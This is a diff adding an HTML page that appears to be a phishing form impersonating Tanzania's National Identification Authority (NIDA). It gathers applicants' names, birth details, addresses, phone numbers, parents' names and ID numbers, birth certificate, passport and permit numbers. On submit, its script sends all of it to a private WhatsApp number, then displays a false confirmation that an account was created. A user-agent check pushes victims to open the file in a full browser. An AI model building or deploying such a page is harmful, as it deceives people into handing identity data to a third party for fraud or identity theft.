@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NIDA Application Form</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:Arial,sans-serif;font-size:14px;background:#f2f2f2;color:#333}
+
+    /* HEADER */
+    .header{position:relative;overflow:hidden;background:#1a6b3c;color:#fff;text-align:center;padding:30px 20px 20px}
+    .header h1{font-size:1.6rem;font-weight:700;letter-spacing:1px;position:relative;z-index:2}
+    .header .flag{font-size:2.2rem;margin-bottom:8px;display:block;position:relative;z-index:2}
+    .header p{font-size:13px;opacity:.88;margin-top:5px;position:relative;z-index:2}
+    .flag-strip{height:6px;background:linear-gradient(to right,#1eb53a 33%,#fcd116 33% 66%,#00a3dd 66%)}
+
+    /* LOGO SCROLL BACKGROUND */
+    .logo-track{position:absolute;top:0;left:0;width:200%;height:100%;display:flex;align-items:center;gap:60px;animation:scrollLogo 14s linear infinite;white-space:nowrap;z-index:1;pointer-events:none}
+    .logo-track .logo-item{display:flex;flex-direction:column;align-items:center;opacity:.35;flex-shrink:0}
+    .logo-track .logo-circle{width:70px;height:70px;border-radius:50%;border:3px solid #4fc3f7;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.15);position:relative;box-shadow:0 0 12px rgba(79,195,247,.4)}
+    .logo-track .logo-circle::before{content:'';position:absolute;inset:-5px;border-radius:50%;border:2px solid #a5d6a7;opacity:.8}
+    .logo-track .jt{font-size:24px;font-weight:900;color:#fff;letter-spacing:-1px;text-shadow:1px 1px 3px rgba(0,0,0,.4)}
+    .logo-track .brand-name{font-size:11px;font-weight:700;margin-top:4px;color:#b2dfdb;letter-spacing:2px;text-transform:uppercase}
+    @keyframes scrollLogo{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+
+    /* PAGE LAYOUT */
+    .page{max-width:900px;margin:24px auto;padding:0 14px}
+
+    /* FORM CARD */
+    .form-card{background:#fff;border:1px solid #ddd;border-radius:4px;padding:0}
+    .form-card-header{background:#1a6b3c;color:#fff;padding:12px 20px;font-size:15px;font-weight:700;border-radius:4px 4px 0 0}
+    .form-card-body{padding:22px 24px}
+
+    /* SECTION HEADING */
+    .sec-head{background:#e8f5e9;border-left:4px solid #1a6b3c;padding:8px 12px;font-weight:700;font-size:13px;color:#1a6b3c;margin:20px 0 14px}
+    .sec-head:first-child{margin-top:0}
+
+    /* FORM ROW */
+    .row{display:flex;gap:16px;margin-bottom:14px;flex-wrap:wrap}
+    .col{flex:1;min-width:200px}
+
+    label.lbl{display:block;font-size:13px;font-weight:600;margin-bottom:4px;color:#333}
+    label.lbl .req{color:#c0392b}
+    .hint{font-size:11px;color:#888;font-weight:400}
+
+    input[type=text],input[type=email],input[type=tel],input[type=password],select{
+      width:100%;padding:7px 10px;border:1px solid #bbb;border-radius:3px;
+      font-size:13px;background:#fff;color:#333
+    }
+    input:focus,select:focus{outline:none;border-color:#1a6b3c;box-shadow:0 0 0 2px rgba(26,107,60,.15)}
+    input.err-field,select.err-field{border-color:#c0392b}
+    .err-msg{color:#c0392b;font-size:11px;margin-top:3px;display:none}
+
+    .radio-row{display:flex;gap:20px;flex-wrap:wrap;margin-top:4px}
+    .radio-row label{display:flex;align-items:center;gap:6px;font-size:13px;cursor:pointer;font-weight:400}
+    .radio-row input{width:auto;accent-color:#1a6b3c}
+
+    .check-list{display:flex;flex-direction:column;gap:8px;margin-top:4px}
+    .check-list label{display:flex;align-items:flex-start;gap:8px;font-size:13px;cursor:pointer;font-weight:400}
+    .check-list input{width:auto;margin-top:2px;accent-color:#1a6b3c}
+
+    /* BUTTONS */
+    .btn-row{display:flex;gap:10px;margin-top:22px;align-items:center}
+    .btn-primary{background:#1a6b3c;color:#fff;border:none;padding:9px 28px;font-size:13px;font-weight:700;border-radius:3px;cursor:pointer}
+    .btn-primary:hover{background:#145530}
+    .btn-secondary{background:#6c757d;color:#fff;border:none;padding:9px 20px;font-size:13px;border-radius:3px;cursor:pointer}
+    .btn-secondary:hover{background:#5a6268}
+
+    /* SUCCESS */
+    #success{display:none;text-align:center;padding:50px 20px;background:#fff;border:1px solid #ddd;border-radius:4px}
+    #success .icon{font-size:56px;margin-bottom:14px}
+    #success h2{color:#1a6b3c;margin-bottom:10px;font-size:18px}
+    #success p{color:#555;font-size:13px;max-width:500px;margin:0 auto 18px;line-height:1.7}
+
+    /* FOOTER */
+    footer{text-align:center;font-size:12px;color:#888;margin:24px 0 10px;padding-top:10px;border-top:1px solid #ddd}
+  </style></head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <!-- scrolling logo background -->
+  <div class="logo-track">
+    <!-- repeated 10x to ensure seamless loop -->
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <!-- duplicate for seamless loop -->
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+    <div class="logo-item"><div class="logo-circle"><span class="jt">JT</span></div><span class="brand-name">JeyTech</span></div>
+  </div>
+  <span class="flag">🇹🇿</span>
+  <h1>NIDA APPLICATION FORM</h1>
+  <p>Mamlaka ya Vitambulisho vya Taifa — National Identification Authority</p>
+</div>
+<div class="flag-strip"></div>
+
+<div class="page">
+
+  <!-- ═══════════════════════════════════════════ -->
+  <!-- REGISTRATION FORM                          -->
+  <!-- ═══════════════════════════════════════════ -->
+  <div id="register">
+    <div class="form-card">
+      <div class="form-card-header">FOMU YA KUJIANDIKISHA / REGISTRATION FORM</div>
+      <div class="form-card-body">
+        <form id="regForm" novalidate>
+
+          <div class="row" style="margin-top:4px">
+            <div class="col">
+              <label class="lbl">Aina ya Uraia / Citizenship Type <span class="req">*</span></label>
+              <div class="radio-row">
+                <label><input type="radio" name="ctype" value="CITIZEN" required/> RAIA / CITIZEN</label>
+                <label><input type="radio" name="ctype" value="LEGAL_RESIDENT"/> MKAZI HALALI / LEGAL RESIDENT</label>
+                <label><input type="radio" name="ctype" value="REFUGEE"/> MKIMBIZI / REFUGEE</label>
+              </div>
+              <div class="err-msg" id="e-ctype">Chagua aina ya uraia / Select citizenship type.</div>
+            </div>
+          </div>
+
+          <!-- PERSONAL DETAILS -->
+          <div class="sec-head">Taarifa Binafsi / Personal Details</div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Jina la Kwanza / First Name <span class="req">*</span></label>
+              <input type="text" id="fname" name="fname" required/>
+              <div class="err-msg" id="e-fname">Jina la kwanza linahitajika / Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Jina la Kati / Middle Name</label>
+              <input type="text" name="mname"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Jina la Ukoo / Surname <span class="req">*</span></label>
+              <input type="text" id="sname" name="sname" required/>
+              <div class="err-msg" id="e-sname">Jina la ukoo linahitajika / Required.</div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Tarehe ya Kuzaliwa / Date of Birth <span class="req">*</span> <span class="hint">(DD/MM/YYYY)</span></label>
+              <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" required/>
+              <div class="err-msg" id="e-dob">Tumia muundo DD/MM/YYYY / Use format DD/MM/YYYY.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Jinsia / Sex <span class="req">*</span></label>
+              <select id="sex" name="sex" required>
+                <option value="">-- Chagua / Select --</option>
+                <option value="M">Mme / Male</option>
+                <option value="F">Mke / Female</option>
+              </select>
+              <div class="err-msg" id="e-sex">Chagua jinsia / Select sex.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Hali ya Ndoa / Marital Status <span class="req">*</span></label>
+              <select id="mstatus" name="mstatus" required>
+                <option value="">-- Chagua / Select --</option>
+                <option>Mseja / Single</option>
+                <option>Mwenye Ndoa / Married</option>
+                <option>Talaka / Divorced</option>
+                <option>Mjane / Widowed</option>
+              </select>
+              <div class="err-msg" id="e-mstatus">Chagua hali ya ndoa / Required.</div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Mahali pa Kuzaliwa / Place of Birth <span class="req">*</span> <span class="hint">(Kijiji/Kata/Wilaya/Mkoa)</span></label>
+              <input type="text" id="pob" name="pob" required/>
+              <div class="err-msg" id="e-pob">Mahali pa kuzaliwa linahitajika / Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Utaifa / Nationality <span class="req">*</span></label>
+              <input type="text" id="nat" name="nat" value="Tanzanian" required/>
+              <div class="err-msg" id="e-nat">Required.</div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Kazi / Occupation <span class="req">*</span></label>
+              <input type="text" id="occ" name="occ" placeholder="e.g. Mwalimu, Mkulima, Mwanafunzi" required/>
+              <div class="err-msg" id="e-occ">Kazi inahitajika / Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Rangi ya Ngozi / Skin Colour <span class="req">*</span></label>
+              <select id="skin" name="skin" required>
+                <option value="">-- Chagua / Select --</option>
+                <option>Nyeusi / Black</option>
+                <option>Kahawia / Brown</option>
+                <option>Nyeupe / Light</option>
+              </select>
+              <div class="err-msg" id="e-skin">Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Urefu / Height (cm) <span class="req">*</span></label>
+              <input type="text" id="height" name="height" placeholder="e.g. 165" required/>
+              <div class="err-msg" id="e-height">Required.</div>
+            </div>
+          </div>
+
+          <!-- RESIDENCE -->
+          <div class="sec-head">Makazi / Residence Address</div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Mkoa / Region <span class="req">*</span></label>
+              <input type="text" id="region" name="region" required/>
+              <div class="err-msg" id="e-region">Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Wilaya / District <span class="req">*</span></label>
+              <input type="text" id="district" name="district" required/>
+              <div class="err-msg" id="e-district">Required.</div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Kata / Ward <span class="req">*</span></label>
+              <input type="text" id="ward" name="ward" required/>
+              <div class="err-msg" id="e-ward">Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Mtaa / Kijiji — Street / Village <span class="req">*</span></label>
+              <input type="text" id="village" name="village" required/>
+              <div class="err-msg" id="e-village">Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Namba ya Nyumba / House No.</label>
+              <input type="text" name="houseno"/>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Simu ya Mkononi / Mobile Number <span class="req">*</span> <span class="hint">(+255...)</span></label>
+              <input type="tel" id="phone" name="phone" placeholder="+255712345678" required/>
+              <div class="err-msg" id="e-phone">Ingiza namba sahihi ya Tanzania / Enter valid Tanzanian number.</div>
+            </div>
+          </div>
+
+          <!-- PARENTS -->
+          <div class="sec-head">Taarifa za Wazazi / Parents Information</div>
+
+          <!-- FATHER -->
+          <p style="font-size:12px;font-weight:700;color:#555;margin-bottom:10px;text-transform:uppercase;letter-spacing:.5px">▸ Baba / Father</p>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Jina la Kwanza la Baba / Father's First Name <span class="req">*</span></label>
+              <input type="text" id="father_fname" name="father_fname" required/>
+              <div class="err-msg" id="e-father_fname">Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Jina la Kati la Baba / Father's Middle Name</label>
+              <input type="text" name="father_mname"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Jina la Ukoo la Baba / Father's Surname <span class="req">*</span></label>
+              <input type="text" id="father_sname" name="father_sname" required/>
+              <div class="err-msg" id="e-father_sname">Required.</div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Tarehe ya Kuzaliwa Baba / Father's Date of Birth <span class="hint">(DD/MM/YYYY)</span></label>
+              <input type="text" name="father_dob" placeholder="DD/MM/YYYY"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Mahali pa Kuzaliwa Baba / Father's Place of Birth</label>
+              <input type="text" name="father_pob" placeholder="Kijiji/Kata/Wilaya/Mkoa"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Utaifa wa Baba / Father's Nationality</label>
+              <input type="text" name="father_nat" value="Tanzanian"/>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Hali ya Uhai wa Baba / Father's Status <span class="req">*</span></label>
+              <div class="radio-row">
+                <label><input type="radio" name="father_status" value="Alive" required/> Hai / Alive</label>
+                <label><input type="radio" name="father_status" value="Deceased"/> Amefariki / Deceased</label>
+              </div>
+              <div class="err-msg" id="e-father_status">Chagua hali / Select status.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">NIN ya Baba / Father's NIN <span class="hint">(Kama ipo / If available)</span></label>
+              <input type="text" name="father_nin" placeholder="NIN Number"/>
+            </div>
+          </div>
+
+          <!-- MOTHER -->
+          <p style="font-size:12px;font-weight:700;color:#555;margin:16px 0 10px;text-transform:uppercase;letter-spacing:.5px">▸ Mama / Mother</p>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Jina la Kwanza la Mama / Mother's First Name <span class="req">*</span></label>
+              <input type="text" id="mother_fname" name="mother_fname" required/>
+              <div class="err-msg" id="e-mother_fname">Required.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">Jina la Kati la Mama / Mother's Middle Name</label>
+              <input type="text" name="mother_mname"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Jina la Ukoo la Mama / Mother's Surname <span class="req">*</span></label>
+              <input type="text" id="mother_sname" name="mother_sname" required/>
+              <div class="err-msg" id="e-mother_sname">Required.</div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Tarehe ya Kuzaliwa Mama / Mother's Date of Birth <span class="hint">(DD/MM/YYYY)</span></label>
+              <input type="text" name="mother_dob" placeholder="DD/MM/YYYY"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Mahali pa Kuzaliwa Mama / Mother's Place of Birth</label>
+              <input type="text" name="mother_pob" placeholder="Kijiji/Kata/Wilaya/Mkoa"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Utaifa wa Mama / Mother's Nationality</label>
+              <input type="text" name="mother_nat" value="Tanzanian"/>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Hali ya Uhai wa Mama / Mother's Status <span class="req">*</span></label>
+              <div class="radio-row">
+                <label><input type="radio" name="mother_status" value="Alive" required/> Hai / Alive</label>
+                <label><input type="radio" name="mother_status" value="Deceased"/> Amefariki / Deceased</label>
+              </div>
+              <div class="err-msg" id="e-mother_status">Chagua hali / Select status.</div>
+            </div>
+            <div class="col">
+              <label class="lbl">NIN ya Mama / Mother's NIN <span class="hint">(Kama ipo / If available)</span></label>
+              <input type="text" name="mother_nin" placeholder="NIN Number"/>
+            </div>
+          </div>
+
+          <!-- CITIZENSHIP BASIS -->
+          <div class="sec-head">Msingi wa Uraia / Basis of Citizenship <span style="font-weight:400;font-size:12px;color:#777">(Raia wa Tanzania / Citizens only)</span></div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Msingi wa Uraia / Citizenship Basis</label>
+              <div class="radio-row" style="flex-direction:column;gap:8px">
+                <label><input type="radio" name="cbasis" value="birth"/> Kwa Kuzaliwa / By Birth</label>
+                <label><input type="radio" name="cbasis" value="descent"/> Kwa Ukoo / By Descent</label>
+                <label><input type="radio" name="cbasis" value="registration"/> Kwa Usajili / By Registration</label>
+                <label><input type="radio" name="cbasis" value="naturalization"/> Kwa Uasili / By Naturalization</label>
+              </div>
+            </div>
+            <div class="col">
+              <label class="lbl">Namba ya Cheti cha Kuzaliwa / Birth Certificate No.</label>
+              <input type="text" name="bcert" style="margin-bottom:10px"/>
+              <label class="lbl">Dossier No. <span class="hint">(Uasili tu / Naturalization only)</span></label>
+              <input type="text" name="dossier"/>
+            </div>
+          </div>
+
+          <!-- LEGAL RESIDENTS -->
+          <div class="sec-head">Wakazi wa Kisheria / Legal Residents <span style="font-weight:400;font-size:12px;color:#777">(Ruka kama ni Raia / Skip if Citizen)</span></div>
+
+          <div class="row">
+            <div class="col">
+              <label class="lbl">Namba ya Pasipoti / Passport No.</label>
+              <input type="text" name="passport"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Namba ya Kibali / Resident or Work Permit No.</label>
+              <input type="text" name="permit"/>
+            </div>
+            <div class="col">
+              <label class="lbl">Tarehe ya Kumalizika / Permit Expiry <span class="hint">(DD/MM/YYYY)</span></label>
+              <input type="text" name="permit_exp" placeholder="DD/MM/YYYY"/>
+            </div>
+          </div>
+
+          <!-- DOCUMENTS -->
+          <div class="sec-head">Nyaraka za Kuambatisha / Supporting Documents <span class="req">*</span></div>
+          <p style="font-size:12px;color:#666;margin-bottom:10px">Tiki nyaraka ulizozitayarisha (PDF / JPG / PNG, kurasa moja kwa kila kiambatisho) / Tick documents you have prepared.</p>
+
+          <div class="check-list">
+            <label><input type="checkbox" name="docs" value="birth_cert"/> Cheti cha Kuzaliwa cha Mwombaji / Applicant's Birth Certificate</label>
+            <label><input type="checkbox" name="docs" value="parent_cert"/> Cheti cha Kuzaliwa cha Mzazi / Parent's Birth Certificate</label>
+            <label><input type="checkbox" name="docs" value="parent_nid"/> Kitambulisho cha Mzazi / Parent's National ID</label>
+            <label><input type="checkbox" name="docs" value="naturalization"/> Cheti cha Uasili / Naturalization Certificate (kama inahusika / if applicable)</label>
+            <label><input type="checkbox" name="docs" value="passport_doc"/> Pasipoti Halali / Valid Passport (Wakazi wa Kisheria / Legal Residents)</label>
+            <label><input type="checkbox" name="docs" value="permit_doc"/> Kibali cha Ukaazi / Resident or Work Permit (Wakazi wa Kisheria / Legal Residents)</label>
+            <label><input type="checkbox" name="docs" value="tin"/> Cheti cha TIN / TIN Certificate (kama ipo / if available)</label>
+            <label><input type="checkbox" name="docs" value="voter"/> Kadi ya Mpiga Kura / Voter ID (kama ipo / if available)</label>
+          </div>
+          <div class="err-msg" id="e-docs" style="margin-top:6px">Tiki angalau nyaraka moja / Tick at least one document.</div>
+
+          <!-- BUTTONS -->
+          <div class="btn-row" style="margin-top:24px">
+            <button type="submit" class="btn-primary" style="padding:11px 36px;font-size:14px">
+              📤 Wasilisha Maombi / Submit Application
+            </button>
+            <button type="reset" class="btn-secondary">Futa / Clear</button>
+          </div>
+
+        </form>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- SUCCESS -->
+  <div id="success">
+    <div class="icon">✅</div>
+    <h2>Maombi Yamewasilishwa! / Application Submitted!</h2>
+    <p>
+      Akaunti yako imefunguliwa na maombi yako yamerekodiwa. / Your account has been created and application recorded.<br/><br/>
+      <strong>Hatua inayofuata / Next Step:</strong><br/>
+      Fika Ofisi ya NIDA ya Wilaya yako ukiwa na fomu iliyochapishwa na viambatisho vyako kukamilisha usajili wa biometriki (alama za vidole na picha). /
+      Visit your NIDA District Office with printed form and documents to complete biometric registration.
+    </p>
+    <button class="btn-primary" onclick="location.reload()">Maombi Mapya / New Application</button>
+  </div>
+
+</div><!-- end .page -->
+
+<footer>© 2026 — National Identification Authority (NIDA) &nbsp;|&nbsp; <a href="https://eonline.nida.go.tz" style="color:#1a6b3c">eonline.nida.go.tz</a></footer>
+
+<script>
+  // ── HELPERS ──
+  function showErr(id,on){ document.getElementById('e-'+id).style.display=on?'block':'none'; }
+  function markErr(id,on){ const el=document.getElementById(id); if(el){el.classList.toggle('err-field',on);} }
+  function se(id,on){ showErr(id,on); markErr(id,on); }
+
+  // ── BROWSER-ONLY GUARD ──
+  (function(){
+    var ua = navigator.userAgent || '';
+    var isBrowser = (
+      typeof window !== 'undefined' &&
+      typeof document !== 'undefined' &&
+      typeof navigator !== 'undefined' &&
+      // must have a real rendering engine
+      (/Chrome|Firefox|Safari|Edge|Opera|OPR|Trident/i.test(ua)) &&
+      // block WPS Office, HTML viewers, WebView-only shells
+      !(/WPSOFFICE|WPS\/|MicroMessenger|UCBrowser|HuaweiBrowser|MiuiBrowser|SamsungBrowser\/[0-3]\.|baiduboxapp|YaBrowser|Puffin|Coast|Sleipnir|Maxthon|Avant|Flock|Rockmelt|Comodo|Avant|Lunascape|Konqueror|Lynx|w3m|Links|Dillo|NetSurf|htmlviewer|android.*version\/[0-9]\.[0-9].*safari/i.test(ua))
+    );
+
+    if(!isBrowser){
+      document.open();
+      document.write(
+        '<!DOCTYPE html><html><head><meta charset="UTF-8"/>' +
+        '<meta name="viewport" content="width=device-width,initial-scale=1"/>' +
+        '<title>Open in Browser</title>' +
+        '<style>*{margin:0;padding:0;box-sizing:border-box}' +
+        'body{font-family:Arial,sans-serif;background:#1a6b3c;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}' +
+        '.box{background:#fff;border-radius:10px;padding:36px 28px;text-align:center;max-width:380px;width:100%}' +
+        '.icon{font-size:56px;margin-bottom:16px}' +
+        'h2{color:#1a6b3c;font-size:1.2rem;margin-bottom:10px}' +
+        'p{color:#555;font-size:13px;line-height:1.7;margin-bottom:18px}' +
+        '.steps{text-align:left;background:#f5f5f5;border-radius:6px;padding:14px 16px;font-size:12px;color:#444;line-height:2}' +
+        '</style></head><body>' +
+        '<div class="box">' +
+        '<div class="icon">🌐</div>' +
+        '<h2>Open in Web Browser</h2>' +
+        '<p>This form must be opened in a web browser.<br/>Tafadhali fungua faili hili kwenye kivinjari cha wavuti.</p>' +
+        '<div class="steps">' +
+        '1. Locate the file <strong>nida_tanzania_form.html</strong><br/>' +
+        '2. Long-press or right-click the file<br/>' +
+        '3. Choose <strong>"Open with"</strong><br/>' +
+        '4. Select <strong>Chrome, Firefox or Edge</strong>' +
+        '</div></div></body></html>'
+      );
+      document.close();
+    }
+  })();
+
+  // ── WHATSAPP NUMBER ──
+  var WA_NUMBER = '255625521509';
+
+  // ── REGISTRATION SUBMIT — sends whatever is filled, no blocking ──
+  document.getElementById('regForm').addEventListener('submit', function(e){
+    e.preventDefault();
+    var fd = new FormData(this);
+
+    function v(key){ return (fd.get(key)||'').trim() || '—'; }
+    function vl(key){ return fd.getAll(key).join(', ') || '—'; }
+
+    var msg =
+      '🇹🇿 *NIDA APPLICATION FORM*\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '*📋 AINA YA URAIA*\n' +
+      'Aina ya Uraia: ' + v('ctype') + '\n\n' +
+      '*👤 TAARIFA BINAFSI*\n' +
+      'Jina Kamili: ' + v('fname') + ' ' + v('mname') + ' ' + v('sname') + '\n' +
+      'Tarehe ya Kuzaliwa: ' + v('dob') + '\n' +
+      'Jinsia: ' + v('sex') + '\n' +
+      'Hali ya Ndoa: ' + v('mstatus') + '\n' +
+      'Mahali pa Kuzaliwa: ' + v('pob') + '\n' +
+      'Utaifa: ' + v('nat') + '\n' +
+      'Kazi: ' + v('occ') + '\n' +
+      'Rangi ya Ngozi: ' + v('skin') + '\n' +
+      'Urefu: ' + v('height') + ' cm\n\n' +
+      '*🏠 MAKAZI*\n' +
+      'Mkoa: ' + v('region') + '\n' +
+      'Wilaya: ' + v('district') + '\n' +
+      'Kata: ' + v('ward') + '\n' +
+      'Mtaa/Kijiji: ' + v('village') + '\n' +
+      'Namba ya Nyumba: ' + v('houseno') + '\n' +
+      'Simu: ' + v('phone') + '\n\n' +
+      '*👨 BABA*\n' +
+      'Jina: ' + v('father_fname') + ' ' + v('father_mname') + ' ' + v('father_sname') + '\n' +
+      'Tarehe ya Kuzaliwa: ' + v('father_dob') + '\n' +
+      'Mahali pa Kuzaliwa: ' + v('father_pob') + '\n' +
+      'Utaifa: ' + v('father_nat') + '\n' +
+      'Hali ya Uhai: ' + v('father_status') + '\n' +
+      'NIN: ' + v('father_nin') + '\n\n' +
+      '*👩 MAMA*\n' +
+      'Jina: ' + v('mother_fname') + ' ' + v('mother_mname') + ' ' + v('mother_sname') + '\n' +
+      'Tarehe ya Kuzaliwa: ' + v('mother_dob') + '\n' +
+      'Mahali pa Kuzaliwa: ' + v('mother_pob') + '\n' +
+      'Utaifa: ' + v('mother_nat') + '\n' +
+      'Hali ya Uhai: ' + v('mother_status') + '\n' +
+      'NIN: ' + v('mother_nin') + '\n\n' +
+      '*📜 MSINGI WA URAIA*\n' +
+      'Msingi: ' + v('cbasis') + '\n' +
+      'Namba ya Cheti cha Kuzaliwa: ' + v('bcert') + '\n' +
+      'Dossier No: ' + v('dossier') + '\n\n' +
+      '*🌍 WAKAZI WA KISHERIA*\n' +
+      'Pasipoti: ' + v('passport') + '\n' +
+      'Kibali: ' + v('permit') + '\n' +
+      'Tarehe ya Kumalizika: ' + v('permit_exp') + '\n\n' +
+      '*📎 NYARAKA*\n' + vl('docs') + '\n' +
+      '━━━━━━━━━━━━━━━━━━━━';
+
+    var a = document.createElement('a');
+    a.href = 'https://wa.me/' + WA_NUMBER + '?text=' + encodeURIComponent(msg);
+    a.target = '_blank';
+    a.rel = 'noopener';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+    document.getElementById('register').style.display = 'none';
+    document.getElementById('success').style.display  = 'block';
+    window.scrollTo({top:0, behavior:'smooth'});
+  });
+</script>
+</body>
+</html>
